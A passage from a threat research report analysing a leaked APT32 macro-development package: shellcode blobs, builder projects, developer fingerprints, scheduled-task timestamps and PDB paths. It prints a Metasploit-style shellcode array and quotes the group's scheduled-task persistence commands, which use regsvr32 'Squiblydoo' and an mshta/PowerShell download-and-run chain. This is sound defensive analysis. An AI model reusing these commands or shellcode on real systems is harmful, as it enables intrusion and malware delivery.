to the XML functionality brought into an updated version of Macros_Builder.What\u2019s the deal with all this shellcode? Interwoven through the StrikeSuit Gift package, amidst the varying projects, solutions, and macros, are a handful of shellcode blobs. Are they malware? What are they? Why are they here? Let\u2019s find out.The one from ShellcodeLoader.vb File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\VB\\ShellcodeLoader\\ShellcodeLoader\\ShellcodeLoader.vb File Size: 195b This array is the default shellcode blob originally seen in ShellcodeLoader.vb, though it is commented out.'Hyeyhafxp = {232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, _ '139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _ '13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _ '116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _2104/2022The origin story of APT32 macros THREAT RESEARCH REPORT'214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _ '36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _ '139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _ '235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _ '224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _ '187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0}With some fiddling we can take this array and, by using Cyberchef, perform a From Decimal and dump snippet of shellcode up with the tool scdbg, we see that it probably is just a placeholder that uses WinExec to open passed arguments. That makes sense because (through Googling around the strings) we can see that this shellcode is borrowed verbatim from several open source code projects surrounding Metasploit VB macros, like this blog post by @scriptjunkie in 2012. It was later tweaked, forked, and copied into a variety of other macros and forms around the internet.The one from test.doc File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\VbaCodeCreator\\VbaCodeCreator\\bin\\Debug\\test.doc Size of Document: 1.13 MB (1182720 bytes) Size of Module1  405757 This is a big document. We know from the context that this will likely have macro content. So, we open it up using oledump to look at the internal streams. We can see several chunks of macro content, many of which will need to be parsed out for us to read it more clearly.oledump test.doc1: 114 '\\x01CompObj' 2: 4096 '\\x05DocumentSummaryInformation' 3: 4096 '\\x05SummaryInformation' 4: 7265 '1Table' 5: 460 'Macros/PROJECT' 6: 95 'Macros/PROJECTwm' 7: M 682475 'Macros/VBA/Module1' 8: m 459686 'Macros/VBA/NewMacros'2204/2022The origin story of APT32 macros THREAT RESEARCH REPORT9: m 948 'Macros/VBA/ThisDocument' 10: 4190 'Macros/VBA/_VBA_PROJECT' 11: 623 'Macros/VBA/dir' 12: 4096 'WordDocument'The embedded macro is easy to carve out, thanks to Didier Steven\u2019s outstanding oledump tool. When we extract Module1, we see the VB script with functions that itemize out a two-dimensional array that is later re-assembled and executed from 30 shellcode functions and nearly 1500 sub-arrays. After we extracted and converted the arrays, we ended up with a shellcode buffer. When the shellcode is executed, we get a pop-up box that tells us DllMain has been executed successfully! Huzzah.The one from RawShellcode File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\ File size 72.99 KB (74740 bytes) We spelunked through all the source code and saw many references to what we believe is this file. This piece of shellcode, hereafter referred to as \u201cthe blob,\u201d is cited in ShellcodeThreadCaller/Main.cpp2304/2022The origin story of APT32 macros THREAT RESEARCH REPORTunder the path C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017-08-23 02-55-49 In VbaCodeCreator/Program.cs the blob is referenced under the path D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49 This blob is also referenced in P17028 - StrikeSuit Gift - Office Macro Type 1/Source/C_Cpp/Binary/Binary/Main.cpp, which parses this file and converts each byte into an integer value. The converted file is saved to \"C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellcode.dat\". And in VB/ShellcodeLoader/ShellcodeLoader.vb, the default shellcode array from the Metasploit post is commented out, and instead, blob is to be read in as Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes(\"./2017-08-23 02-55-49 With a name so specific, and having also located a file by this name within the overall package, we are probably safe in assuming that the references within the source are indeed the file with MD5 assumption that this developer is using this blob for testing and trying to make sure that this piece of shellcode works within all of their tooling. But what is this blob, exactly? Let\u2019s find out. Looking at the blob alone, we can see that it does not have a sort of standard file header. Starting at offset 0x00C0, there are parts of a Windows PE header, which is always a good indication that we may be looking at an executable file wrapped in a shellcode loader.000000a0: aa7a a105 78fb 0bf9 5a45 df5a 7fe1 d104 .z x ZE.Z 000000b0: 75f7 5aed 08e2 fbf8 94f8 ae87 0e1f ba0e u.Z 000000c0: 00b4 09cd 21b8 014c cd21 5468 6973 2070 ! L.!This p 000000d0: 726f 6772 616d 2063 616e 6e6f 7420 6265 rogram cannot be 000000e0: 2072 756e 2069 6e20 444f 5320 6d6f 6465 run in DOS mode 000000f0: 2e0d 0d0a 2400 0000 0000 0000 4073 b402 $ @s 00000100: 0412 da51 0412 da51 0412 da51 1f8f 4451 Q Q Q DQWhen we load this up in a disassembler like IDA Pro, the first four bytes at the start of the file are converted to a call instruction. A subsequent call leads to a function at offset 0xF684, which is responsible for decoding the remaining payload of the blob.2404/2022The origin story of APT32 macros THREAT RESEARCH REPORTAs we started reverse engineering this shellcode function to understand how the payload is deployed at a granular level, we identified a 2019 blog post from Qi Anxin about this group's HTA downloaders. They had analyzed a version of this shellcode loader, and our findings were consistent. However, unlike their findings, our shellcode did not deploy a remote access tool, but presented us with a message box saying, \u201cDllMain has been executed successfully!\u201d. At this point, we see that the blob payload is a generic executable created to test their loaders without risking self-infection or making callouts to live C2 infrastructure. While this seems obvious and sensible, there are several assessments we can make from this knowledge. The first is their development capabilities are not the same as those conducting the attacks. This is also supported by the aforenoted use of GUIs, which can easily be used by less technical operators conducting attacks. Furthermore, the development team is sharp enough not to test their kit using actual offensive tooling, reducing the risk of accidentally leaking a final payload. The careful handling does not necessarily imply that they are an apex predator, yet it shows that this developer took some basic steps to avoid accidentally leaking sensitive information. But no matter the sophistication, malware developers are always human, and all humans make mistakes.The typical VB macro content For most of the macro content across all the StrikeSuit Gift projects, the macros were mainly used to create scheduled tasks that would download additional payloads in a couple of ways. One way uses the regsvr32.exe remote download technique that is sometimes referred to as \u201cSquiblydoo.\u201dsCMDLine = \"schtasks /create /sc MINUTE /tn \"\"Windows Media Sharing\"\" /tr \"\"\\\"\"regsvr32.exe\\\"\" /s /n /u /i:url scrobj.dll\"\" /mo AAAREGSVR32AAA\"The other way uses an XML scheduled task with rundll32.exe and arguments to have mshta execute VB script that would run a PowerShell download.2504/2022The origin story of APT32 macros THREAT RESEARCH REPORT<Command>rundll32.exe</Command> <Arguments>mshta vbscript:Execute(\"CreateObject(\"WScript.Shell\").Run\"powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('url\"\"\", 0:code close\")</Arguments>2604/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter IV2704/2022The origin story of APT32 macros THREAT RESEARCH REPORTStrikeSuit malware development conventions When reacting to intrusions and campaigns around the world, analysts and researchers are often left to speculate on the adversary\u2019s capabilities, the tradecraft involved, and the details surrounding the original malware development environment. However, when we have the source code, we get a better picture of what was going on behind the scenes. What we see here largely matches our expectations, and yet we learn that malware developers are really no different than your everyday software developers.Documenting antivirus and compatibility testing Whether you work in IT or in a SOC, whether you throw down on NTFS or pcap, whether you work in Sublime or VS Code, you are probably stuck in a world of note-taking, testing, and documentation. Those developing malware face the same challenges in terms of planning, assessing efficacy, and tracking bugs and enhancements over time. In the StrikeSuit Gift package, we see evidence of the malware development team performing testing of Office documents on a select set of antivirus solutions. The verbatim excerpt below is from the file AVs-Test/Result.txt and demonstrates that this developer\u2019s macro solution was absolutely crushing AV as of August 24, 2017.* AV update ngay 2017/08/24- 360 CN - 360 Total Security - Windows DefenderOffice 2010 x86OOOOO OTrojan-Downloader.Script.GenericO O2804/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these names you are familiar with and some acronyms for household names. For those that aren\u2019t obvious, KIS is likely Kaspersky, and NIS is probably Norton. It\u2019s worth highlighting two lesser-known names in the list above:\u25cf BKAV may be a reference to Bkav Corporation which is one of the more popular antivirusproviders in Vietnam (url\u25cf CMC may be a reference to CMC Cyber Security, another Vietnam-centered antivirus provider(url antivirus testing, we see that the malware developers were assessing compatibility with a handful of Microsoft Office versions. The excerpt below is from Office-Versions/Verions.txt, and it is clear that the tooling needs some enhancements.Work: - Office 2010 x86 - Office 2013 x86 - Office 2016 x86Fail: - Office 2010 x64 (Type mismatch) - Office 2013 x64 (Type mismatch) - Office 2016 x64 (Type mismatch)Feature testing, housekeeping, and fingerprints Throughout the source codebase we see common conventions of software development. Malware developers face many of the same technological and organizational challenges as any software developer. They need to test small features and build incremental capabilities that work together. They need to keep their folder trees tidy, and they need to back up their code in case they make any catastrophic mistakes. They need to keep track of their tasks, their OKRs, and MBOs. They\u2019re doing the same job, just on the other side of the grind. They\u2019re only human, and accordingly, they can\u2019t help but leave dirty fingerprints across all their digital work.Cleaning up the development mess with _Cleanup.bat Along with the Macros_Builder project, we find a batch file named _Cleanup.bat that appears designed to delete unnecessary artifacts from the development system. According to 7-zip, the last2904/2022The origin story of APT32 macros THREAT RESEARCH REPORTmodified time is sometime around 2013-10-29 00:18, so perhaps this cleanup script was used and copied around from drive to drive, project to project, to allow the developers to quickly scrub their workstations or directories as needed. File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\ File Name: _Cleanup.bat File Size: 3840 This excerpt of _Cleanup.bat begins with a warning, and a commented out loop for deleting Visual Studio Solutions User Options (.SUO  files, after which there is a long list of for loops with different files to delete.@echo off echo Warning!! This file can delete wanted/needed files! Use with caution! echo Hit enter to continue using this file, or close it if you do not want to run it. REM pausefor /f \"tokens=1 delims=\" %%a in ('dir /b /s *.ncb') do ( del /Q \"%%a\" echo %%a deleted. )REM Dont delete config of VS REM ///////////////////////////////////////////////////////////////////////// REM for /f \"tokens=1 delims=\" %%a in ('dir /b /s /A:H *.suo') do ( REM attrib -H \"%%a\" REM del /Q \"%%a\" REM echo %%a deleted. REM ) REM /////////////////////////////////////////////////////////////////////////Neither the exact batch scripting nor the file types are particularly illuminating. This doesn\u2019t look like a malware developer \u201ccovering their tracks\u201d but rather a tidy programmer wanting an easy, scriptable way to delete chaff that may come from different versions of Visual Studio and different linkers and compilers and code artifacts that span many generations of development technology.3004/2022The origin story of APT32 macros THREAT RESEARCH REPORTFile names or extensionsNote*.ncb*.suo*.tlh*.tli*.sdf*.userVisual C   IntelliSense DatabaseVisual Studio Solutions User Options (excluded)C/C   Type Library HeaderC/C   Type Library ImplementationVisual Studio Code Browser DatabaseVisual Studio User Options*BuildLog.htmVisual Studio Build Log (pre-VS2010 *.ilk*.pdb*.idb*.obj*.pch*.ipch*.tlogVisual Studio Incremental LinkingProgram Database/Debug SymbolsVisual Studio Intermediate Debug FileVisual Studio ObjectPrecompiled HeaderIntelliSense Precompiled HeaderMSBuild File Tracker Log*.vshost.exeVisual Studio Hosting IDE Process*.vshost.exe.configVisual Studio Hosting IDE Process*.vshost.exe.manifestVisual Studio Hosting IDE Process*.old*.stdafx.obj*.exp ? Visual Studio Precompiled Header ObjectExported Functions Data*.Build.CppClean.logCPPClean Task Log  ? 3104/2022The origin story of APT32 macros THREAT RESEARCH REPORT*.lastbuildstateMSBuild  ? *.intermediate.manifestVisual Studio Manifest*.embed.manifestVisual Studio Manifest*.embed.manifest.resVisual Studio Manifest*mt.dep*.Cache*Properties.Resources.resou rces*Form1.resources*csproj.FileList.txtVisual Studio ManifestVisual StudioVisual StudioVisual StudioVisual Studio*.csproj.FileListAbsolute.txtVisual Studio*.sbr*.bscVisual Studio Intermediate Symbolic DataVisual Studio Browser Symbol DataWe couldn\u2019t find much evidence of this batch file in other places, but we came up lucky on a Github search and arrived at this page, which has a nearly word-for-word copy of the batch script functionality: url There are only slight differences between StrikeSuit\u2019s _Cleanup.bat and aangaymoi\u2019s .sln.clean.bat script. The former has the .SUO loop commented out and was present back in 2017, whereas the latter was saved to Github in 2021 and does not exclude the .SUO deletion. Still, in the StrikeSuit Gift package, it seems as though the _Cleanup.bat script was never run. So, we will let this investigative thread dangle in the wind for now and move on to look at the artifacts of the development process such as the .SUO files.Visual Studio Solution User Options (.suo) analysis We were lucky enough to capture a copy of the source code package before the _Cleanup.bat script was run, so we obtained copies of lots of nitty-gritty files that come along with Visual Studio development, including Solution User Options (.suo) files. This is uncommon, and these files are not3204/2022The origin story of APT32 macros THREAT RESEARCH REPORTparsed by common aftermarket tooling, so we are left exploring the data structures to look for interesting tidbits that we might tease out of the saved states of each of the solutions. navigate through the portions of the SUO data structure.3304/2022The origin story of APT32 macros THREAT RESEARCH REPORTRunning through all the SUO file structures is laborious and didn\u2019t yield much more than a string dump would have done anyway. We find paths to source code files, project names, etc. We can infer from the myriad of references in XmlPackageOptions, OutliningStateDir, etc., that the HtaDotnet and ShellcodeLoader solutions were originally under the folder path G:\\WebBuilder\\Gift_HtaDotnet\\. This is also supported by the PDB paths of older built binaries within the broader StrikeSuit Gift package. From looking at DebuggerWatches values in other projects, we can see that the malware developer was actively debugging the historical programs.SUO fileDebuggerWatchesWebBuilder/HtaDotNet/HtaDotnet.v11.suoWebBuilder/ShellcodeLoader/.vs/L/v14/.suoWebBuilder/ShellcodeLoader/L.suoresult(char)77(char)773404/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe examination of SUOs was a fruitless exercise and something of a dead end, but it was an important one to capture. Not all investigative threads turn up DNA and fingerprints. Sometimes they are just another vignette and another ephemeral glimpse into the elusive life of a malware author. There\u2019s nothing mind-blowing from this SUO inspection because these structures do not give us any great insights that the source code does not already provide. However, should you happen to find .SUO files without accompanying source code, these files could be rich in information about the Visual Studio solution, the malware author, or the original development environment.Development in progressTesting features and functions Analysis of this source code package is messy because it is non-linear and involves multiple timelines. Still, we see the iterative nature of development and how the malware authors tried and tested small capabilities before integrating them into other projects. Development was clearly in progress at the time this package was leaked, and we can see a few examples of this. For example, XmlStrAnalyst was a simple VB project to write an XML scheduled task to disk. This project was built around 8/16/2017. It appeared as a precursor to the functionality that was later pushed as an enhancement into the updated version of Macros_Builder, which was modified to use XML scheduled tasks.Backup structure Obviously, when you expand upon a piece of older code that works, you don\u2019t want to mess it up with alterations. What\u2019s the first thing you do? You back it up! The malware developer working on this project created archive copies of WebBuilder.rar and Macros_Builder.zip to protect these older, working projects.Macro comparisons There were two different versions of MacrosSource.txt in the source code package. We see active development and testing of the macro content through diffing these files.3504/2022The origin story of APT32 macros THREAT RESEARCH REPORTPath in P17028   StrikeSuit Gift   Office Macro Type 1\\Reference\\SizeRAR mod timestampMacros_Builder\\Macros_Builder\\MacrosSource.txt140573/10/2016 23:40:00Macros_Builder\\Macros_Builder\\bin\\Debug\\MacrosSource.txt182197/19/2016 21:34:00Using Visual Studio Code\u2019s built-in comparison capability, we can highlight the line-by-line differences in these two files. The most notable difference is that the more recently modified MacrosSource.txt has adjustments to SpawnBase63 procedure to include incorporating an XML scheduled task for persistence and execution of the remote download. This change was made partially because the Macros_Builder program has a modified add_schedule_vba.txt, which is the source for the macro content. It seems as though the developer ran the debug build of this program with input to the GUI, leaving us some juicy network toolmarks of a C2 server that may have been used during testing. How exciting!We know. But hold your horses; we will dive into these details soon.3604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThere are also two copies of add_schedule_vba.txt, one of which is in an older zip archive of the Macros_Builder project. The only change in this file was the addition of additional quotation marks in the XMLStr macro arguments for the PowerShell download. Development was obviously in progress.Path in P17028   StrikeSuit Gift   Office Macro Type 1\\Reference\\SizeModified timeMacros_Builder.zip\\Macros_Builder\\Resources\\add_schedule_v ba.txt181159/08/2016 03:44:00Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.t xt181338/17/2017 21:23:003704/2022The origin story of APT32 macros THREAT RESEARCH REPORTBorrowed and repurposed open-source code The last piece of assessing the totality of this source code was to look at the various solutions, projects, and components, and then think about which pieces were borrowed or \u201cliberated\u201d from open source code projects. While this may not shed light on the future of the malware projects we see here, understanding the use of public code speaks to the developers' inspiration.FilesNotesVB/ShellcodeLoader/- ShellcodeLoader.vbThese pieces contain age-old macro content with variable names originally generated by scriptjunkie and used in a 2012 blog post.CSharp/VbaCodeCreator- vba_code_builder.txtMacros_Builder- add_schedule_vba.txtThis exact code, with randomized variables Zopqv Hyeyhafxp Xlbufvetp, etc., are used verbatim across many derivative projects (rather than generating original VB code from MSF . So, it may not be directly sourced from this blog, but it is clear that the code was not generated using meterpreter by the developer. It obviously was copypasta\u2019d from somewhere around the internet.Vba_code_builder.txt uses the same VBA7 top block with variables Zopqv Dkhnszol and so forth but then uses some variables to replace with shellcode substitutions. These are later replaced in Core.csBase64Encode2 and other functions taken directly from this text file.Types STARTUPINFO and SECURITY_ATTRIBUTES and more could have been taken directly from ancient VB samples like this one.3804/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder/HtaDotNet- HtaDotnet.csWebBuilder/ShellcodeLoader /Test- Program.csMacros_Builder/- _Cleanup.batThese pieces contain several function names originally seen in James Forshaw\u2019s DotNetToJScript, such as Deserialize_2 BuildLoaderDelegate, etc. (here and here).This cleanup script does not have much public presence, or at least not much that is easily searchable. But in February 2021, a very similar script showed up on Github.3904/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter V4004/2022The origin story of APT32 macros THREAT RESEARCH REPORTStockpiling the unique toolmarks and indicators If you\u2019ve made it this far in the story, you are desperately aching to see connections to APT32. But don't rush this! Let the suspense wash over you and enjoy this moment. This is the job, and we\u2019re taking our sweet time with it. Before we hit you with the attribution angles, let\u2019s reassess the surface area of all this data and bubble up the unique values that could be helpful in searching for connections. To get us started, we searched through all of the files, source code, notes, and compiled builds, and extracted toolmarks, names, file paths, IP addresses, GUIDs, timestamps, and other dirty developer fingerprints.Usernames, handles, and hostnames We extracted a variety of usernames and handles from the various files. It is clear that there are a couple of players at work here, though we do not get much information beyond simple names and a default Windows hostname.NamestoxicRachaelArnoldNotesReadMe.txt, with open date of 2017 08 11From PDB paths and test paths inside source codeAuthor name in test.doc created 2017:08:25 08:30:00WIN-FF211E5QDM2\\RachaelEmbedded in XmlStr.txt after Rachael executed XmlScriptAnalyst.exeDistinct macro timestamps from a scheduled task XML file Seven digit decimals in a timestamp One oddly notable project in the StrikeSuit Gift package is XmlStrAnalyst, which seems to be a test for building or modifying XML scheduled tasks. It uses VB code to write to an outfile XmlStr.txt. Looking at the top of the XmlStr.txt document, we see it is indeed raw XML for a Windows scheduled task. What stands out immediately are unique timestamps that speak to the potential age of the original malware development.4104/2022The origin story of APT32 macros THREAT RESEARCH REPORT<?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"url\"> <RegistrationInfo><Date>2016-06-02T11:13:39.1668838</Date> <Author>WIN-FF211E5QDM2\\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PTBBBPOWERBBBM</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>These hard-coded timestamps are observed in both Macros_Builder\u2019s add_schedule_vba.txt and XmlScriptAnalyst\u2019s Module1.vb. They are subsequently written into MacrosSource.txt and XmlStr.txt when Macros_Builder.exe or XmlScriptAnalyst.exe are executed, respectively. It may be worthwhile to note that these are unique timestamps, and at first glance, it seems odd that the timestamps have seven digits of precision after the seconds value. With seven digits, we know it\u2019s not milliseconds, it's not microseconds, it\u2019s not nanoseconds. So how exactly did these seven-digit timestamps get made, anyway? We presume it has to be created by Windows, somehow.\u25cf 2016-06-02T11:13:39.1668838 \u25cf 2016-06-02T11:12:49.4495965Testing the export of scheduled tasks XML The simplest explanation for the timestamps above is that before this was put into any VB script or Visual Studio solution, the malware developer created and exported an XML scheduled task using the Windows Task Scheduler. They used that as a template for the Macros_Builder and XmlScriptAnalyst projects. To test this theory, we jump into a VM and try to recreate how a malware author might create and export the Scheduled Task XML. Step 1  Using the Windows Task Scheduler, we create a test task.4204/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 2  We create a trigger to initiate the task once, and then we select the repeat task every one hour and set the duration to Indefinitely. Note that the start time we select here will be 2022 03 02 at 8 41 05AM  EST in our Virtual Machine).4304/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 3  We create an action for the task to run rundll32.exe with arguments to execute a VB scriptlet.Step 4  We finalize the Scheduled Task, then right-click the task entry and export to an XML file.4404/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 5  We view the exported scheduled task XML and see that it indeed contains the date timestamps with seven points of decimal precision. Further, we see that the Task Scheduler embeds the author computer name and username in our test file. We confirm that the RegistrationInfo Date timestamp is when we created the task, and the Trigger StartBoundary timestamp is when our task is set to begin. What a joyous day.<?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"url\"><RegistrationInfo><Date>2022-03-02T08:43:01.7591912</Date> <Author>user-PC\\user</Author></RegistrationInfo> <Triggers><TimeTrigger><Repetition><Interval>PT1H</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition> <StartBoundary>2022-03-02T08:41:05.5580189</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>4504/2022The origin story of APT32 macros THREAT RESEARCH REPORT<Principals><Principal id=\"Author\"><UserId>user-PC\\user</UserId> <LogonType>InteractiveToken</LogonType> <RunLevel>LeastPrivilege</RunLevel></Principal></Principals> <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries> <AllowHardTerminate>true</AllowHardTerminate> <StartWhenAvailable>false</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle></IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>P3D</ExecutionTimeLimit> <Priority>7</Priority></Settings> <Actions Context=\"Author\"><Exec><Command>rundll32.exe</Command> <Arguments>mshta vbscript:Execute(\"CreateObject(\"WScript.Shell\").Run\"powershell.exe -nop -whidden -c \"\"IEX ((new-object net.webclient).downloadstring('url\"\"\", 0:code close\")</Arguments></Exec></Actions></Task>The XML for a Scheduled Task is not generated unless you export it, so we can guess that Windows is storing the information used to create the XML somewhere in the registry. Using regedit.exe, we pull up HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\ to browse around Tasks keys. We see that there is a registry key for our Time Test Task, where the DynamicInfo key stores what is likely to be our StartBoundary timestamp.4604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThis value 1E7B9C6F3B2ED801 is a Windows FILETIME, a 64-bit structure containing the number of 100-nanosecond intervals since Jan 1, 1601. Using CyberChef, we can convert 1E7B9C6F3B2ED801 to a more human-readable format using the Windows FILETIME to UNIX Timestamp operation, which confirms this hex value is 2022-03-02 at 13:43:01 UTC (or 8 43 AM EST . In Windows, w32tm.exe takes 10^ 7s  100 nanoseconds) intervals and converts to a readable format. The value 1E7B9C6F3B2ED801 in Int64 is 132907021817903902. Passing that value into w32tm.exe gives us this:C:\\Users\\user\\Desktop>w32tm.exe /ntte 132907021817903902 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PMOf course, after doing all of that, we find out there is an easier way. We can pass the byte flipped hex of the original value:C:\\Users\\user\\Desktop>w32tm.exe /ntte 0x01D82E3B6F9C7B1E 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM4704/2022The origin story of APT32 macros THREAT RESEARCH REPORTWell, we can see that w32tm.exe presents this timestamp to us just like we expected and with the expected seven digits of precision. However, it is unclear how or why the last 7 digits differ from what we see in our XML timestamp. Naturally, as with all things in digital forensics, you have to know what your tools are doing behind the scenes to understand if they are summarizing or truncating numbers and to what degree of specificity, let alone the correct time offset. Timestamps, amirite?Developer fingerprints in scheduled task XML When we switch back to looking at XmlStr.txt, we see that this XML contains the original malware developer\u2019s computer name, user name, and timestamps that likely indicate the approximate date on the development system when the XML script content was originally created, around the time it was used to create macros in the 2016 version of Macros_Builder.<?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"url\"> <RegistrationInfo><Date>2016-06-02T11:13:39.1668838</Date> <Author>WIN-FF211E5QDM2\\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PTBBBPOWERBBBM</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>One final nugget of interest is the interval value PTBBBPOWERBBBM. This is a value that was altered from the original exported XML to be a placeholder value that would be changed depending on values entered in the GUI of the Macros_Builder program. Except this value is never referenced. Instead, Macros_Builder Form1.cs checks the macro content to replace the value BBBPOWERBBB. This is one of many small errors that shows that the program is obviously undergoing development at the time of interception.4804/2022The origin story of APT32 macros THREAT RESEARCH REPORTIf you\u2019re a seasoned Windows forensicator, you\u2019re likely already familiar with Windows timestamp shenanigans, and none of this is new or surprising to you. So why should you care and why does any of this timestamp business matter? Well, seeing seven digits of precision in an XML scheduled task may indicate that it was created and exported by the Windows Task Scheduler. This structure of the timestamp can be used for detection purposes to highlight content that was generated with this approach.Network-based indicators The MacrosSource.txt file stored output from an execution of the newer debug build of Macros_Builder, leaving us these IP addresses that may have been used for the testing of the macro Several of the StrikeSuit Gift projects were compiled in debug mode, leaving us clear paths to the PDB symbol files, reflecting information about the original development directories. Though we cannot necessarily trust these timestamps to indicate the true original compile time, these paths and timestamps together paint a fuzzy evolutionary timeline from old to new code and capabilities.4904/2022The origin story of APT32 macros THREAT RESEARCH REPORThash.md5pe.timestamppe.pdb_path850b062d81975c43 6dc5d03d4053372f2008-09-01 18:48:30 (1220309310)2009-05-16 07:47:06 (1242474426)2009-05-16 07:47:14 (1242474434)2009-05-16 07:47:14 (1242474434)2009-05-16 09:44:30 (1242481470)2009-05-16 09:44:31 (1242481471)2009-05-16 09:44:40 (1242481480)g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShLdr\\\\obj\\\\Debug\\\\ShLd r.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Release\\\\Test.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\L\\\\obj \\\\Debug\\\\L.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Debug\\\\Test.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\HtaDotnet\\\\o bj\\\\Debug\\\\HtaDotnet.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\D ebug\\\\Test.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\R elease\\\\Test.pdbce985259ba7a962f 39c48f157e31f5aa2013-10-08 12:00:51 (1381248051)d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\MacrosEmbedding\\\\MacrosEmbedding\\\\ob j\\\\Debug\\\\MacrosEmbedding.pdb1a54a5af55fa7210 f0f6e7b8118661ff2013-10-08 12:08:52 (1381248532)d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\VbaCodeCreator\\\\VbaCodeCreator\\\\obj\\ \\Debug\\\\VbaCodeCreator.pdbd1c8da885b9f283c f2114e53fee43fe02016-01-26 04:18:22 (1453799902)d:\\\\Source\\\\visual\\\\Embed Office\\\\NtfsStreams\\\\Trinet.Core.IO.Ntfs\\\\obj\\\\Debug\\\\T rinet.Core.IO.Ntfs.pdbfeda9657a3861805 4fe95a07dad545982016-03-11 04:02:13d:\\\\Source\\\\visual\\\\Embed Office\\\\Office Macros\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Release\\\\M5004/2022The origin story of APT32 macros THREAT RESEARCH REPORT(1457686933)acros_Builder.pdb4bfb1d2889d29936 c72513c9e187937e2016-04-06 21:18:55 (1459991935)d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdbc0ea1573b006ab4b 419af0e6b29df5502016-07-20 00:32:49 (1468989169)d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdb8d74fc0ef81b32f7 3c0797ec2a03e6772017-08-14 00:31:58 (1502685118)D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\MacrosEmbeddingExample\\\\MacrosEmbedd ingExample\\\\obj\\\\Debug\\\\MacrosEmbeddingExample.pdbe1a3d0eb585567a6 9eb2a0606b622e102017-08-17 00:03:09 